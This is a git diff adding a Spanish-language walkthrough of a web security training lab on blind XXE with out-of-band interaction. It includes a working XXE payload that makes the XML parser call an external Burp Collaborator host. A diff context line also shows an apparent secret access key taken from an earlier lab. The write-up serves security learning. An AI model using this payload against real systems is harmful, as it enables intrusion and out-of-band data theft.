@@ -105,3 +105,29 @@ Y los que nos piden es el **secret access key** el cual sería **wORR4gS3GaX0Qzb
 
 ## 3. Lab: Blind XXE with out-of-band interaction
 
+```
+Este laboratorio tiene una función "Check stock" que analiza la entrada XML pero no muestra el resultado.
+
+Puede detectar la vulnerabilidad ciega XXE activando interacciones fuera de banda con un dominio externo.
+
+Para resolver el laboratorio, use una entidad externa para hacer que el analizador XML emita una búsqueda de DNS y una solicitud HTTP a Burp Collaborator.
+```
+
+Entonces, vamos al laboratorio e interceptamos en segundo plano todos los paquetes en el burpsuite, entonces vamos a un producto y hacemos clic en **Check stock** y buscamos el paquete en el **Http history** y lo enviamos al **Repeater**.
+
+![](img8.png)
+
+Entonces ahora lo que haremos será inciar el **Burp collaborator** y realizar una consulta con el siguiente payload basado en la estructura XML del paquete.
+
+```
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://geyl1g8xhwzi53mt93v09dqgg7mxam.burpcollaborator.net"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
+```
+
+![](img9.png)
+
+Como podemos ver, se realizó la consulta al sitio web generado con Burp Collaborator, aunque no existió ninguna respuesta por lado del servidor mas que el error de **Invalid product ID**. Entramos al home del laboratorio desde el navegador para verificar que completamos el laboratorio.
+
+![](img10.png)
+
+## 4. Lab: Blind XXE with out-of-band interaction via XML parameter entities
+
